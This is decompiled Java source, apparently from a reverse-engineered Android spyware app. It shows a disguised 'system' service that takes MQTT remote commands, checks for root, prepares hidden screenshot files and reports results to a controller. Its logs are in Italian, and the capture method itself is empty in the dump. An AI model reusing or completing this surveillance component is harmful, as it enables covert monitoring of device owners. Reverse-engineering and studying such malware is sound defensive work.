package com.app.system.common;

import android.app.Service;
import android.content.Intent;
import android.os.Bundle;
import android.os.IBinder;
import com.app.system.common.d.a.e;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;
import java.io.File;
import java.util.Date;

public class ScreenshotService
  extends Service
{
  private MqttCommand a;
  
  private File a()
  {
    File localFile = getExternalCacheDir();
    if (localFile == null) {
      return null;
    }
    localFile = new File(localFile, "Camera/");
    localFile.mkdirs();
    long l = new Date().getTime() / 1000L;
    StringBuilder localStringBuilder = new StringBuilder();
    localStringBuilder.append(l);
    localStringBuilder.append("_S.png");
    return new File(localFile, localStringBuilder.toString());
  }
  
  private void a(final int paramInt, final String paramString)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        MqttCommandReply localMqttCommandReply = ScreenshotService.a(ScreenshotService.this).b(ScreenshotService.this);
        localMqttCommandReply.result = paramInt;
        localMqttCommandReply.replyText = paramString;
        new e(ScreenshotService.this).a(localMqttCommandReply);
      }
    }).start();
  }
  
  private void a(File paramFile) {}
  
  public IBinder onBind(Intent paramIntent)
  {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
  {
    com.security.d.a.d("ScreenshotService", "Servizio avviato", new Object[0]);
    this.a = ((MqttCommand)paramIntent.getExtras().get("mqtt-cmd"));
    com.security.d.a.d("ScreenshotService", "Controllo permessi di ROOT...", new Object[0]);
    if (com.app.system.common.e.a.a())
    {
      com.security.d.a.d("ScreenshotService", "Permessi di ROOT disponibili", new Object[0]);
      paramIntent = a();
      if (paramIntent == null)
      {
        com.security.d.a.a("ScreenshotService", "SDCARD non disponibile", new Object[0]);
        a(1, "SDCARD non disponibile");
      }
      else
      {
        StringBuilder localStringBuilder = new StringBuilder();
        localStringBuilder.append("Salvataggio screenshot su file ");
        localStringBuilder.append(paramIntent.getAbsolutePath());
        com.security.d.a.d("ScreenshotService", localStringBuilder.toString(), new Object[0]);
        a(paramIntent);
      }
    }
    return 2;
  }
}


/* Location:              ~/com/app/system/common/ScreenshotService.class
 *
 * Reversed by:           J
 */